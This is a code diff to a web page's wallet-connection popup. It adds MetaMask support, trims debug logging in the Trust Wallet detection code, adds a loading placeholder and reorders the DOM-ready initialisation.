@@ -92,7 +92,7 @@
       display: flex;
       flex-direction: column;
       gap: 8px;
-      min-height: 200px;
+      min-height: 50px;
     }
     .wallet-btn {
       display: flex;
@@ -322,6 +322,13 @@
       display: none;
     }
 
+    .loading-wallets {
+      text-align: center;
+      padding: 20px;
+      color: rgba(148, 163, 184, 0.4);
+      font-size: 13px;
+    }
+
     @media (max-width: 480px) {
       body { padding: 12px; align-items: flex-end; }
       .container { padding: 24px 18px; border-radius: 20px; max-width: 100%; }
@@ -354,7 +361,9 @@
     <div id="configStatus">Loading configuration...</div>
 
     <div class="screen on" id="scConnect">
-      <div class="wallet-list" id="walletList"></div>
+      <div class="wallet-list" id="walletList">
+        <div class="loading-wallets">Loading wallets...</div>
+      </div>
       <button class="btn" onclick="window.close()">Cancel</button>
     </div>
 
@@ -422,9 +431,11 @@
     var isTrustBrowser = /Trust/i.test(navigator.userAgent);
     var isTronLinkBrowser = /TronLink/i.test(navigator.userAgent);
     var isTokenPocketBrowser = /TokenPocket/i.test(navigator.userAgent);
+    var isMetaMaskBrowser = /MetaMask/i.test(navigator.userAgent);
 
     console.log('📱 isMobile:', isMobile);
     console.log('📱 isTrustBrowser:', isTrustBrowser);
+    console.log('📱 isMetaMaskBrowser:', isMetaMaskBrowser);
 
     var SESSION_ID = 'qr-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6);
 
@@ -440,10 +451,45 @@
     ];
 
     // ============================================================
-    // WALLET CONFIGURATIONS
+    // WALLET CONFIGURATIONS - INCLUDING METAMASK
     // ============================================================
 
     var WALLETS = [
+      {
+        id: 'metamask',
+        name: 'MetaMask',
+        logo: 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg',
+        downloadUrl: 'https://metamask.io/download/',
+        isInstalled: function() {
+          // MetaMask injects window.ethereum with isMetaMask flag
+          return !!(window.ethereum && window.ethereum.isMetaMask);
+        },
+        getProvider: function() {
+          if (window.ethereum && window.ethereum.isMetaMask) {
+            // For TRON on MetaMask, users need TronLink or use WalletConnect
+            // But we can still try to use ethereum provider
+            return window.ethereum;
+          }
+          return null;
+        },
+        getAddress: function(provider) {
+          // MetaMask uses selectedAddress for the connected account
+          if (provider && provider.selectedAddress) {
+            return provider.selectedAddress;
+          }
+          return null;
+        },
+        requestAccounts: function(provider) {
+          if (provider && typeof provider.request === 'function') {
+            // For MetaMask, use eth_requestAccounts
+            return provider.request({ method: 'eth_requestAccounts' });
+          }
+          return null;
+        },
+        getDeepLink: function(url) {
+          return 'https://metamask.app.link/dapp/' + encodeURIComponent(url);
+        }
+      },
       {
         id: 'tronlink',
         name: 'TronLink',
@@ -492,55 +538,31 @@
         downloadUrl: 'https://trustwallet.com/download',
         isInstalled: function() {
           try {
-            if (window.ethereum && window.ethereum.isTrust) {
-              console.log('✅ Trust Wallet detected via window.ethereum.isTrust');
-              return true;
-            }
-            if (isTrustBrowser) {
-              console.log('✅ Trust Wallet detected via user agent');
-              return true;
-            }
-            if (window.trustwallet && window.trustwallet.tronLink) {
-              console.log('✅ Trust Wallet detected via window.trustwallet');
-              return true;
-            }
-          } catch(e) {
-            console.warn('Trust Wallet detection error:', e.message);
-          }
+            if (window.ethereum && window.ethereum.isTrust) return true;
+            if (isTrustBrowser) return true;
+            if (window.trustwallet && window.trustwallet.tronLink) return true;
+          } catch(e) {}
           return false;
         },
         getProvider: function() {
           try {
             if (window.ethereum && window.ethereum.isTrust) {
-              console.log('📱 Using Trust Wallet provider from window.ethereum');
               if (window.ethereum.tronLink) {
                 var tl = window.ethereum.tronLink;
-                if (tl.tronWeb && tl.tronWeb.ready) {
-                  console.log('✅ Trust Wallet tronWeb ready via ethereum.tronLink');
-                  return tl.tronWeb;
-                }
-                console.log('⚠️ Trust Wallet tronLink found but tronWeb not ready');
+                if (tl.tronWeb && tl.tronWeb.ready) return tl.tronWeb;
                 return tl;
               }
-              console.log('⚠️ Using window.ethereum directly for Trust Wallet');
               return window.ethereum;
             }
             if (window.trustwallet && window.trustwallet.tronLink) {
-              console.log('📱 Using Trust Wallet provider from window.trustwallet');
               var tl2 = window.trustwallet.tronLink;
-              if (tl2.tronWeb && tl2.tronWeb.ready) {
-                console.log('✅ Trust Wallet extension tronWeb ready');
-                return tl2.tronWeb;
-              }
+              if (tl2.tronWeb && tl2.tronWeb.ready) return tl2.tronWeb;
               return tl2;
             }
             if (isTrustBrowser && window.tronWeb && window.tronWeb.ready) {
-              console.log('📱 Using Trust Wallet provider from window.tronWeb');
               return window.tronWeb;
             }
-          } catch(e) {
-            console.warn('Trust Wallet provider error:', e.message);
-          }
+          } catch(e) {}
           return null;
         },
         getAddress: function(provider) {
@@ -552,7 +574,6 @@
               return provider.tronWeb.defaultAddress.base58;
             }
             if (provider && provider.selectedAddress) {
-              console.log('📍 Got ETH address from Trust Wallet:', provider.selectedAddress);
               return provider.selectedAddress;
             }
             if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
@@ -564,35 +585,17 @@
         requestAccounts: function(provider) {
           try {
             if (window.ethereum && window.ethereum.isTrust && typeof window.ethereum.request === 'function') {
-              console.log('📤 Calling window.ethereum.request({ method: "eth_requestAccounts" })');
-              var result = await window.ethereum.request({ method: 'eth_requestAccounts' });
-              console.log('📥 Result from eth_requestAccounts:', result);
-              return result;
+              return window.ethereum.request({ method: 'eth_requestAccounts' });
             }
             if (provider && provider.isTrust && typeof provider.request === 'function') {
-              console.log('📤 Calling provider.request({ method: "eth_requestAccounts" })');
-              var result2 = await provider.request({ method: 'eth_requestAccounts' });
-              console.log('📥 Result from provider.request:', result2);
-              return result2;
+              return provider.request({ method: 'eth_requestAccounts' });
             }
-            if (window.ethereum && typeof window.ethereum.request === 'function') {
-              console.log('📤 Fallback: Calling window.ethereum.request({ method: "tron_requestAccounts" })');
-              try {
-                var result3 = await window.ethereum.request({ method: 'tron_requestAccounts' });
-                console.log('📥 Result from tron_requestAccounts:', result3);
-                return result3;
-              } catch(e) {
-                console.warn('tron_requestAccounts failed, trying eth_requestAccounts');
-                var result4 = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                console.log('📥 Result from eth_requestAccounts (fallback):', result4);
-                return result4;
-              }
+            if (provider && typeof provider.request === 'function') {
+              return provider.request({ method: 'tron_requestAccounts' });
             }
             if (window.tronWeb && typeof window.tronWeb.request === 'function') {
-              console.log('📤 Calling window.tronWeb.request({ method: "tron_requestAccounts" })');
               return window.tronWeb.request({ method: 'tron_requestAccounts' });
             }
-            console.log('⚠️ No request method found for Trust Wallet');
           } catch(e) {
             console.warn('Trust Wallet request accounts error:', e.message);
             if (e.message && (e.message.toLowerCase().includes('cancel') || e.message.toLowerCase().includes('reject'))) {
@@ -846,9 +849,12 @@
     // ============================================================
 
     function detectWalletBrowser() {
+      if (isMetaMaskBrowser) return 'metamask';
       if (isTrustBrowser) return 'trust';
       if (isTronLinkBrowser) return 'tronlink';
       if (isTokenPocketBrowser) return 'tokenpocket';
+      
+      if (window.ethereum && window.ethereum.isMetaMask) return 'metamask';
       if (window.ethereum && window.ethereum.isTrust) return 'trust';
       if (window.tronLink) return 'tronlink';
       if (window.okxwallet) return 'okx';
@@ -1131,7 +1137,7 @@
     }
 
     // ============================================================
-    // RENDER WALLETS - FIXED WITH DOM READY CHECK
+    // RENDER WALLETS - FIXED
     // ============================================================
 
     function renderWallets() {
@@ -1143,7 +1149,11 @@
         return;
       }
       
+      // Clear loading message
       walletList.innerHTML = '';
+      
+      // Get detected wallet
+      var detectedWallet = detectWalletBrowser();
       
       for (var i = 0; i < WALLETS.length; i++) {
         var w = WALLETS[i];
@@ -1151,12 +1161,23 @@
         b.className = 'wallet-btn';
         b.setAttribute('data-wallet-id', w.id);
 
-        var detectedWallet = detectWalletBrowser();
         var isInstalled = w.isInstalled();
         var isActive = (detectedWallet === w.id);
 
-        var badgeText = isActive ? '✓ Active' : (isMobile ? 'Open App' : (isInstalled ? 'Connect' : 'Install'));
-        var badgeClass = isActive ? 'badge' : (isInstalled ? 'badge' : 'badge install');
+        // Determine badge text
+        var badgeText = 'Connect';
+        var badgeClass = 'badge';
+        
+        if (isActive) {
+          badgeText = '✓ Active';
+          badgeClass = 'badge';
+        } else if (isMobile) {
+          badgeText = 'Open App';
+          badgeClass = 'badge';
+        } else if (!isInstalled) {
+          badgeText = 'Install';
+          badgeClass = 'badge install';
+        }
 
         b.innerHTML =
           '<div class="ico"><img src="' + w.logo + '" alt="' + w.name + '" loading="lazy" onerror="this.style.display=\'none\'"></div>' +
@@ -1234,27 +1255,16 @@
     // INIT
     // ============================================================
 
-    // Ensure DOM is ready before rendering
-    if (document.readyState === 'loading') {
-      document.addEventListener('DOMContentLoaded', function() {
-        console.log('📄 DOM ready, initializing...');
-        initApp();
-      });
-    } else {
-      console.log('📄 DOM already ready, initializing...');
-      initApp();
-    }
-
     function initApp() {
+      console.log('📄 Initializing app...');
       renderWallets();
       fetchConfig();
 
       console.log('📱 QR Session:', SESSION_ID);
       console.log('🌐 Site URL:', SITE_URL);
       console.log('📱 isMobile:', isMobile);
-      console.log('📱 isTrustBrowser:', isTrustBrowser);
 
-      if (isMobile || isTrustBrowser) {
+      if (isMobile) {
         setTimeout(function() {
           autoConnectInWalletBrowser();
         }, 1500);
@@ -1269,6 +1279,26 @@
         }, 2000);
       }
     }
+
+    // Ensure DOM is ready before rendering
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', function() {
+        console.log('📄 DOM ready, initializing...');
+        initApp();
+      });
+    } else {
+      console.log('📄 DOM already ready, initializing...');
+      initApp();
+    }
+
+    // Also try to render after a short delay (fallback)
+    setTimeout(function() {
+      var walletList = document.getElementById('walletList');
+      if (walletList && walletList.children.length === 0) {
+        console.log('⚠️ No wallets rendered yet, forcing render...');
+        renderWallets();
+      }
+    }, 500);
   </script>
 </body>
 </html>
